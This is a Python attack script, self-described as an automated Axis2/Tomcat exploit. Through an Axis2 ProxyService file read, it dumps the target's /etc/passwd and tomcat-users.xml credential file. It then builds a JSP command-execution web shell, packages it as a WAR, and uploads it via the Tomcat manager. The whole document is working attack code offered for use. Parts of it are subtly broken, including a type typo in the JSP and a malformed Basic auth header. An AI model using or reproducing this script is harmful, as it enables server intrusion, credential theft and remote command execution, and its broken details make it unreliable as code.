#!/usr/bin/env python3

import argparse
import requests
import re
import os
import tomcatmanager as tm
from pimento import menu
import base64

parser = argparse.ArgumentParser(description='Automated axis2/TomCat exploit.')
parser.add_argument('host', metavar='N', help='The apache/tomcat host you want to run the script against')
args = parser.parse_args()
targethost = args.host

menu_choice = menu(
        ['','Dump target passwd & TomCat-Users.xml', 'Deploy Shell'],
        
        pre_prompt='Actions:',
        post_prompt='What are we doing [{}]:',
        default_index=1,
        indexed=True,
        insensitive=True,
        fuzzy=True
        )

def file_dumps(targethost):
    get_etc_passwd_file = requests.get("http://"+targethost+"/axis2/services/ProxyService/get?uri=file:///etc/passwd")
    get_tomcat_users_file = requests.get("http://"+targethost+"/axis2/services/ProxyService/get?uri=file:///etc/tomcat6/tomcat-users.xml")

    if(get_etc_passwd_file.status_code == 200):
        if not os.path.exists("/tmp/"+targethost):
            os.makedirs("/tmp/"+targethost)
        with open("/tmp/"+targethost+"/"+targethost+"_passwd.txt","w") as f:
            f.write(get_etc_passwd_file.content.decode('utf-8'))
            f.close()
        print("** Target Passwd file dumped to /tmp/"+targethost+"/"+targethost+"_passwd.txt **")
        with open("/tmp/"+targethost+"/"+targethost+"_tomcat_users.xml","w") as x:
            x.write(get_tomcat_users_file.content.decode('utf-8'))
            x.close()
        print("** Target TomCat users file Dumped to /tmp/"+targethost+"/"+targethost+"_tomcat_users.xml")


def deploy_shell(targethost):
    print("_________________________")
    print("Generating Shell/WAR file")
    print("_________________________")

    jsp_code = """<form method=GET ACTION="index.jsp"> 
    <Input name='cmd' type=text>
    <Input type=submit value='pwn'>
    </form>
    <%@ page import="java.io.*" %>
    <%
        String cmd = request.getParameter("cmd");
        String output = "";
        if(cmd != null){
            Strubg s = null;
            try {
                Process p = Runtime.getRuntime().exec(cmd,null,null);
                BufferedReader sI = new BufferedReader(new InputStreamReader(p.getInputStream()));
                while((s = sI.readLine()) != null) {output += s+"</br>"; }
            }
                catch(IOException e) { e.printStackTrace(); }
        }
        %>
        <pre><%=output %></pre>"""

    if not os.path.exists("/tmp/webshell"):
        os.makedirs("/tmp/webshell")
    with open("/tmp/webshell/index.jsp","w") as y:
        y.write(jsp_code)
        y.close()
    os.system("jar -cvf /tmp/webshell.war /tmp/webshell")
    print("_________________")
    print("** WAR Created **")
    print("_________________\n")
    tom_manager_user = input("Target TomCat Username: ")
    tom_manager_pass = input("Target TomCat Password: ")
    tom_manager_login = "http://"+targethost+"/manager/html"
    manager_session = requests.session()
    #t = requests.put(tom_manager_login, auth=(tom_manager_user,tom_manager_pass))

    tcat_creds = "Basic "+tom_manager_user +":" + tom_manager_pass
    tcat_creds = tcat_creds.encode("utf-8")

    auth = base64.b64encode(tcat_creds)

    file={'warshell': ('/tmp/webshell.war', open('/tmp/webshell.war',"rb"), 'application/octet-stream')}

    uplreq = requests.Request('POST', tom_manager_login+"/upload",files=file)
    pupreq = uplreq.prepare()
    pupreq.headers['Authorization'] = auth
    resp = manager_session.send(pupreq)

    print(resp.status_code)


if menu_choice == 'Dump target passwd & TomCat-Users.xml':
    file_dumps(targethost)
elif menu_choice == 'Deploy Shell':
    deploy_shell(targethost) 




